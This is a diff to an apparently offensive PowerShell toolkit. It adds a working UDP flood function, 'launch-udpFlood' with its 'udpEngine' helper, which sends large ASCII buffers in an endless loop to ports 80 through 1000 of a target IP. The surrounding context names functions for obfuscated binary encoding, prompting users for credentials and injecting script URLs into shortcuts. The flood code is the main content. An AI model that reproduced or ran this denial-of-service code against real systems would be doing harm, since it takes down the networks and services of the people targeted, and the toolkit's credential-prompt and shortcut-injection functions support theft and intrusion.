@@ -220,7 +220,6 @@ function byte-encode {
 
 }
 
-
 #[->] recovers binaries encoded in obfuscated base64 strings  
 function byte-decode( $b64file, $key ) {
 
@@ -333,6 +332,70 @@ function askfor-creds {
 
 }
 
+function launch-udpFlood {
+
+	[CmdletBinding()] Param(
+	
+	[Parameter(Position=0)]
+	[String]$targetIP
+
+	)
+
+	## Check IP variable
+	
+	if ($targetIP) {
+	
+		# launch udp flood on range of ports
+		foreach ( $port in 80..1000 ) { udpEngine $targetIP $port }
+
+	} else { write-output "[!] target IP not specified, required!" }
+	
+}
+
+function udpEngine {
+
+	[CmdletBinding()] Param(
+	
+	[Parameter(Position=0, Mandatory = $true)]
+	[String]$tIP,
+	
+	[Parameter(Position=1, Mandatory = $true)]
+	[String]$prt
+	
+	)
+	
+	$address = [system.net.IPAddress]::Parse( $tIP )  
+
+	# Create IP Endpoint   
+	$end = New-Object System.Net.IPEndPoint $address , $prt 
+
+	# Create Socket   
+	$Saddrf    = [System.Net.Sockets.AddressFamily]::InterNetwork  
+	$Stype    = [System.Net.Sockets.SocketType]::Dgram  
+	$Ptype     = [System.Net.Sockets.ProtocolType]::UDP  
+	$Sock      = New-Object System.Net.Sockets.Socket $saddrf , $stype , $ptype   
+	$Sock.TTL = 26
+  
+  
+	while ($true) {
+  
+	  
+		# Connect to socket   
+		$sock.Connect( $end )  
+
+		# Create encoded buffer insert loop here that get data from the generated file
+		$Enc = [System.Text.Encoding]::ASCII
+		$Message = "QWERTYUIOPASDFGHJKLZXCVBNMqwertyuiopasdfghjklzxcvbnm1234567890" * 700
+		$Buffer  = $Enc.GetBytes( $Message )  
+
+		# Send the buffer   
+		$Sent   = $Sock.Send( $Buffer )  
+		
+		
+	
+	}
+
+}
 
 function gen-enccmd {
 
@@ -539,8 +602,6 @@ function shortcut-inject {
 	} else { write-output "[!] FAilED!`n[!]You need to use a proper URL format ex: http://ex_domain.com/script or https://ex_domain.com/script" }
 
 }
-
-
 
 # action = hide or clear
 # key = encrpytion or decryption string
